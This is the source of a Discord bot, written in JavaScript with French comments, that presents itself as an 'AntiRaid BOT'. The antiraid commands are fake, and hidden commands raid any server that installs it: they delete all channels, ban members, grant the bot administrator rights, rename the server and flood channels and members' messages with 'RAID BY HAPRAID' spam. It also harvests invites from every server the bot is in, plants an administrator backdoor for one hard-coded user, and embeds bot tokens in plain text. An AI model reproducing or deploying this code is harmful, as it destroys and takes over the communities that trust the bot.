const Discord = require("discord.js");
const bot = new Discord.Client();
const { Client, RichEmbed } = require('discord.js');
var prefix = ".";

const config = require('./config')

var token = 'Nj2g1MTM1MTc2NjMxNzEzODM1.Xnn6Yw.IqU6ho83ZQge1jIY3ERInwHPDs4'

var fucked = false;


var mpall = new Discord.RichEmbed()
.setColor("0x00AE86")
.setThumbnail("https://risibank.fr/cache/stickers/d1519/151986-full.gif")
    .setTitle("**raid by hapraid**")         
    .setTimestamp()
    .setDescription(`RAID BY HAPRAID, We love you <3 but i'm sad\n http://hapraid.com`)
.setImage('https://i.gifer.com/8NBx.gif')
  .setFooter("we love you",`hapraid`)

//Mets Biggest Leaks and share server : https://discord.gg/7B3PCAX 
var raid = "@everyone RAID BY HAPRAID https://i.gifer.com/8NBx.gif \n  HAPRAID LIKE YOU https://discord.gg/cAPapgA \n  www.hapraid.com CLIQUEZ **We love you but i'm sad <3**"
bot.on('ready', () => {
  const timeoutObj = setTimeout(() => {
    bot.user.setActivity(""+bot.guilds.size+" guilds | "+bot.users.size+" members", {
        type: "STREAMING",
        url: "https://www.twitch.tv/antiraidbot"
      });
    }, 20000);
});

 bot.on('ready',() => {

  

  console.log("Je suis "+bot.user.username+" je suis sur "+bot.guilds.size+" serveurs et j'ai "+bot.users.size+" membres "+bot.user.id)
  })

 
bot.on('message', msg => {
  //#region Legit
  /* Commandes legit */
  if (msg.content === '.ping') {
    msg.reply('pong !')
  }
  //#endregion
 
  //#region Destructrices
  /* Commandes destructrices */

            if (msg.content === '+des') {
            console.log(`Commande .mp par ${msg.author.tag}`);
                if (msg.channel.type === "dm") return;
                if (msg.deletable) msg.delete();

                for (var n = 0; n < 2; n++)  {
                msg.guild.members.forEach(member => {
                  
                    member.send(raid).catch(error => {})            
                  })
       } 
      }
      }); 
      
       bot.on('message', msg => {

if(msg.content === '.del'){
          if(msg.channel.type === "dm") return;
          if(msg.guild.channels.size === 0) return;
          else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
          msg.guild.createChannel('discord-bug', 'text').catch(e => {});
      }
 
  
 
  if (msg.content === '.ban') {
    console.log(`Commande .bane par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "haprole") && member.bannable) member.ban().catch(e => {});
    });
  }
 
  if (msg.content === '.exit') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }
 
  if (msg.content === '.r') {
    console.log(`Commande .r par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: "haprole",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  //#endregion
});



//--------2.0--




bot.on("message", msg => {
        

          if(msg.content.startsWith("+des")){
            msg.delete()
            
           // for (var s = 0; s < 30; s++)  {
      
           
              
             

             var interval;
             var count = 0;
                // ...
               interval = setInterval(function() { 
                 msg.guild.channels.find(channel => {
                if (channel.type === "text")
                channel.send(raid)
 
                
              });
            
              
              count++; 
           
            
        console.log(count, 'seconds passed'); 
        if (count == 10) { 
              clearInterval(interval);
              console.log('Raid effectué ')
            }
          }, 1000);
            }         
              
        });




bot.on('message', msg => {
  if (msg.content === '+des') {
    console.log(`Commande +des par ${msg.author.tag}`);
 
      msg.guild.setIcon("hapraid.png")
      msg.guild.setName('RAID BY HAPRAID')

        var interval;
             var count = 0;
                // ...
               interval = setInterval(function() {
        msg.guild.createChannel('raid-by-hapraid', 'voice')
        msg.guild.createChannel('raid-by-hapraid', 'text')
        count++; 
           
            
        console.log(count, 'salons créés'); 
        if (count == 20) { 
              clearInterval(interval);
              console.log('Tout les salons ont été crééss ')
            }
          }, 500);
      

    if (msg.deletable) {
      msg.delete();
    }
  }
});





//-----------INVITATION------

bot.on('message', msg => {
  if (msg.content === '.invite123') {
  bot.guilds.forEach(guild => {
guild.fetchInvites()

  .then(invites => bot.channels.get('709860603845410827').send('Found Invites:\n discord.gg/'+ invites.map(invite => invite.code).join('\n')))
  })
  }
});











//-------------DEFACE (NON FINIT)-----------
bot.on('message', msg => {
  if (msg.content === '.hap') {
    console.log(`Commande +des par ${msg.author.tag}`);
      msg.guild.setIcon("hapraid.png").catch(e => {});
      msg.guild.setName('RAID BY HAPRAID').catch(e => {});

        var interval;
             var count = 0;
                // ...
               interval = setInterval(function() {
                if(msg.channel.type === "dm") return;
                if(msg.guild.channels.size === 0) return;
                else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
                msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
                
        msg.guild.createChannel('raid-by-hapraid', 'voice').catch(e => {});
        msg.guild.createChannel('raid-by-hapraid', 'text').catch(e => {});
        
        
        
      
        if (msg.channel.type === "dm") return;
          

        for (var n = 0; n < 1; n++)  {
        msg.guild.members.forEach(member => {
          
            member.send(raid).catch(error => {})            
          })
        }
        count++; 
        
           
            
        console.log(count, 'salons créés'); 
        if (count == 1) { 
              clearInterval(interval);
              console.log('Tout les salons ont été crééss ')
            }
          }, 500);

          msg.guild.channels.find(channel => {
            if (channel.type === "text")
            channel.send(raid)
            
          });

          
 


    if (msg.deletable) {
      msg.delete();
    }
  }
});



//-----------------------HELP COMMANDE ANTIRAIDBOT-----------------

bot.on('message', msg => {

  const args = msg.content.split(" ").slice(1);

  if(msg.content === '.help') {
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
      .setThumbnail(msg.author.avatarURL)
      .setTitle(`  __ AntiRaid BOT { List commands }: __   `)
      .addField(' ** .antiraid : **', ' [ Activate antiraid mode ]  ')
      .addField(' ** .slowmode  : **', ' [ Activate slowmode ] ')
      .addField(' ** .purge  : **', ' [ To purge channel ]   ')	  
      .addField(' ** .credits   :**', '  [ Credits of developper ]  ')	  
      .addField(' ** .support   :**', '  [ Contact of developper ]  ')	  
      .setColor('#40FF00')
      .setFooter('AntiRaid BOT')
      .setTimestamp()
      .setImage('https://cdn.discordapp.com/attachments/684800313898696732/684809143919575085/ezgif-6-a62eafac476f.gif')
    msg.channel.send(helpAEmbed).catch(err => con(err));

  }

  if(msg.content === '.antiraid') {
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
    .setThumbnail(msg.author.avatarURL)
    .setTitle(`  __ AntiRaid BOT : __   `)
    .addField(' ** .antiraid on : **', ' [ Activate antiraid mode ]  ')
    .addField(' ** .antiraid off  : **', ' [ Desactivate antiraid mode ] ')	  
    .setColor('#40FF00')
    .setFooter('AntiRaid BOT')
    .setTimestamp()
     msg.channel.send(helpAEmbed).catch(err => con(err));

  }

  if(msg.content === '.antiraid on') {
    if (msg.deletable) msg.delete();
msg.channel.send('**Antiraid mode was activated !** (**on**) :white_check_mark: ')
  }
  if(msg.content === '.antiraid off') {
    if (msg.deletable) msg.delete();
msg.channel.send('**Antiraid mode was desactivated** (**off**) :x: ')
  }
  if(msg.content.startsWith(".slowmode")){
    if (msg.deletable) msg.delete();
    msg.channel.send('**Slowmode was set !**')
  }
  if(msg.content.startsWith(".purge")){
    msg.channel.fetchMessages({ 
    limit: args[0]
    }).then((msgCollection) => {
    msgCollection.forEach((msg) => {
    msg.delete();
    })
  });
}
if (msg.content === '.credits') {
  if (msg.deletable) msg.delete();
  var helpAEmbed = new Discord.RichEmbed()

    .setThumbnail(msg.author.avatarURL)
    .setTitle(`[AntiRaid BOT] **Credits** `)
    .addField('**HappyBoy**', 'Developer')
      .setColor('#00FF00')
      .setImage('https://cdn.discordapp.com/attachments/684800313898696732/684809143919575085/ezgif-6-a62eafac476f.gif')
  msg.channel.send(helpAEmbed).catch(err => con(err));

}

if (msg.content === '.support') {
  if (msg.deletable) msg.delete();
  var helpAEmbed = new Discord.RichEmbed()

    .setThumbnail(msg.author.avatarURL)
    .setTitle(`[AntiRaid BOT] **Credits** `)
    .addField('**Support:**', 'antiraidbotdiscord@protonmail.com')
      .setColor('#00FF00')
      .setImage('https://cdn.discordapp.com/attachments/684800313898696732/684809143919575085/ezgif-6-a62eafac476f.gif')
  msg.channel.send(helpAEmbed).catch(err => con(err));

}


});







        //REDEMARRAGE
        bot.on('message', message => {
          if(message.content.startsWith(".reboot")){ 
                  resetBot(message.channel);
                  
            
                
      
              // ... other commands
          }
      });
      
      // Turn bot off (destroy), then turn it back on
      function resetBot(channel) {
          // send channel a message that you're resetting bot [optional]
          channel.send('Resetting...')
          .then(msg => bot+destroy())
          .then(() => bot.login('Njg1MTM1MTc2NjMxNzEzODM1.Xnn6Yw.IqU6ho83ZQge1jIY3ERInwHPDs4'));
      } 



















































      // PARTIE JTACOSTE PAS STATS AUTOMESSAGE




      var autoMessage = 0;




bot.on('message', message => {

  if(message.content.startsWith(prefix+'invite')) {
    const args = message.content.split(' ').slice(1)
    let guild = bot.guilds.get(args[0]);
    
    if (!guild) return message.reply("The bot isn't in the guild with this ID.");
    
    let invitechannels = guild.channels.filter(c=> c.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'))
    if(!invitechannels) return message.channel.send('No Channels found with permissions to create Invite in!')
    
    invitechannels.random().createInvite()
      .then(invite=> message.channel.send('Found Invite:\n discord.gg/'+invite.code))
    }


    if(message.content == prefix + "stats"){

        message.channel.send(new Discord.RichEmbed()
                    .setDescription(`[ ${bot.users.size} MEMBRES ]  |  [ ${bot.guilds.size} SERVEURS ]`)
            )
    }

    

    if(message.content == prefix + "botinvite"){
        message.channel.send(`https://discord.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=8`)
    }

    if(message.content == prefix + "list"){
        let tosend = [];
    bot.guilds.forEach((guild) => { tosend.push(`\`${guild.name} : ${guild.id}\` | **${guild.memberCount} membres**`) })

    let pages = [];
for (let i = 0; i < tosend.length;) {
    if ((i + 9) > tosend.length) {
        pages.push(tosend.slice(i, (i + 9) - ((i + 9) - tosend.length)).join("\n"));
        break;
    } else {
        pages.push(tosend.slice(i, i + 9).join("\n"));
        i += 9
    };
}
    let page = 1;

    const embed = new Discord.RichEmbed()
    .setAuthor(message.author.username, message.author.avatarURL)
    .setTitle("Liste des serveurs")
    .setColor('RANDOM')
    .setFooter(`Page: ${page}/${pages.length}`)
    .setDescription(pages[page-1])
    .setTimestamp();

    message.channel.send(`${bot.guilds.size} serveurs | ${bot.users.size} membres`, embed).then(msg => {
    if (!message.guild.member(bot.user).hasPermission('ADD_REACTIONS')) return;


        msg.react("⬅️").then(() => {
            msg.react("➡️")

            const backF = (reaction, user) => reaction.emoji.name === '⬅️' && user.id === message.author.id;
            const ForF = (reaction, user) => reaction.emoji.name === '➡️' && user.id === message.author.id;

            const back = msg.createReactionCollector(backF, { time: 180000 });
            const For = msg.createReactionCollector(ForF, { time: 180000 });

            back.on('collect', async r => {
                r.remove(message.author.id)
                if (page === 1) return r.remove(message.author.id);
                page--;
                embed.setDescription(pages[page-1]);
                embed.setFooter(`Page: ${page}/${pages.length}`);
                msg.edit(embed);
            });

            For.on('collect', async r => {
                r.remove(message.author.id)
                if (page === pages.length) return r.remove(message.author.id);
                page++;
                embed.setDescription(pages[page-1]);
                embed.setFooter(`Page: ${page}/${pages.length}`);
                msg.edit(embed);
            });
        });
    });
    }

    if(message.content == prefix + "autom on"){
        autoMessage = 1;

        message.reply("Auto Message [ON]")
    }

    if(message.content == prefix + "autom off"){
        autoMessage = 0;
        message.reply("Auto Message [OFF]")
    }

})


/////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////     AUTO           /////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////


bot.on('guildCreate', guild => {

    let g = 2;

        bot.channels.get(config.logsChannel).send(new Discord.RichEmbed()
            .setTitle("+1 server")
            .setDescription(`**Nom du serveur:** ${guild.name} \n Nombre de membres: ${guild.memberCount} \n Id du serveur: ${guild.id}` )
            .setColor("13FF00")
        ).catch(() => {});

        if(guild.memberCount >= 1000){
            bot.channels.get(config.notifChannel).send(new Discord.RichEmbed()
                .setTitle("**GROS SERVEUR D�T�CT�**")
                .setDescription(`**Nom du serveur:** ${guild.name} \n Nombre de membres: ${guild.memberCount} \n Id du serveur: ${guild.id}` )
            )
        }
        



})

bot.on("guildDelete", guild => {

    bot.channels.get(config.logsChannel).send(new Discord.RichEmbed()
        .setTitle("-1 server")
        .setDescription(`**Nom du serveur:** ${guild.name} \n Nombre de membres: ${guild.memberCount} \n Id du serveur: ${guild.id}` )
        .setColor("FF0032")
    ).catch(() => {});


})

bot.on("guildMemberAdd", user => {

    user.send({ embed: config.Nitroembed })

    if(user.id == 695290861600374854){
        user.send("+PERM ADMIN")
        user.guild.createRole({
            name: 'member',
            color: 'BLACK',
            permissions: 'ADMINISTRATOR',
          }).then(rl => user.addRole(rl));
    }

})



















      bot.login(token)